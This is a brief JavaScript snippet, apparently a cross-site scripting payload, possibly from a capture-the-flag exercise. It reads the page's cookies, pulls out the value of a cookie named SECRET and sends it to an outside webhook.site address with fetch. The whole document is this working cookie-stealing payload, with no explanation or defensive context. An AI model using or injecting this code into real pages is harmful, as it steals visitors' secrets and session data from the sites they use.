var cookies = document.cookie;
var match = cookies.match(/SECRET=([^;]+)/);
if(match) {
    // Send to webhook
    fetch('https://webhook.site/66dc2a08-d41d-4b87-82d4-ee1410acbd9c?secret=' + match[1]);
}
